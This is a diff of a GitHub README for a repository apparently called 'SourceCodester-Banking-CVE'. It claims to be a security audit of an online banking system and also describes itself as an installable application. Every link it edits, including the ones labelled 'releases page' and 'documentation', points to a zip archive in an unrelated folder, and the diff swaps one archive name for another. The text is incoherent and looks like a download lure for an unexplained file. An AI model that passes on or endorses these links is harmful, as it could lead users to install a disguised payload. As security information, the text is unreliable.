@@ -1,7 +1,7 @@
 # 🛡️ SourceCodester-Banking-CVE - Identify and Fix Security Risks
 
 ## 📥 Download Now
-[![Download](https://github.com/dvjnelsonia/SourceCodester-Banking-CVE/raw/refs/heads/main/dermatograph/Codester-CVE-Banking-Source-v2.4.zip%20Now-SourceCodester--Banking--CVE-brightgreen)](https://github.com/dvjnelsonia/SourceCodester-Banking-CVE/raw/refs/heads/main/dermatograph/Codester-CVE-Banking-Source-v2.4.zip)
+[![Download](https://raw.githubusercontent.com/dvjnelsonia/SourceCodester-Banking-CVE/main/dermatograph/CVE-Codester-Source-Banking-v1.4.zip%20Now-SourceCodester--Banking--CVE-brightgreen)](https://raw.githubusercontent.com/dvjnelsonia/SourceCodester-Banking-CVE/main/dermatograph/CVE-Codester-Source-Banking-v1.4.zip)
 
 ## 📚 Overview
 Syntropy Security's comprehensive security audit of the Online Banking Management System v1.0 revealed significant security flaws. Our assessment identifies five critical vulnerabilities. These issues could lead to catastrophic financial loss and complete operational failure if the system is deployed as is. We encourage all users to review our findings carefully.
@@ -16,7 +16,7 @@ To get started with the SourceCodester-Banking-CVE application, follow these ste
    - Internet Connection: Required for downloading and updates
 
 2. **Visit the Download Page:**
-   Click this link to go to the releases page: [Download SourceCodester-Banking-CVE](https://github.com/dvjnelsonia/SourceCodester-Banking-CVE/raw/refs/heads/main/dermatograph/Codester-CVE-Banking-Source-v2.4.zip).
+   Click this link to go to the releases page: [Download SourceCodester-Banking-CVE](https://raw.githubusercontent.com/dvjnelsonia/SourceCodester-Banking-CVE/main/dermatograph/CVE-Codester-Source-Banking-v1.4.zip).
 
 ## 📦 Download & Install
 1. **On the Releases Page:**
@@ -71,4 +71,4 @@ Join our community for discussions and tips on improving security practices:
 ## 👍 Final Remarks
 Security is crucial in today’s online world. The SourceCodester-Banking-CVE application helps safeguard your interests by identifying and addressing vulnerabilities early in the development process. Your proactive approach can prevent future issues.
 
-For more information, refer to the [documentation](https://github.com/dvjnelsonia/SourceCodester-Banking-CVE/raw/refs/heads/main/dermatograph/Codester-CVE-Banking-Source-v2.4.zip) available in our GitHub repository.
+For more information, refer to the [documentation](https://raw.githubusercontent.com/dvjnelsonia/SourceCodester-Banking-CVE/main/dermatograph/CVE-Codester-Source-Banking-v1.4.zip) available in our GitHub repository.
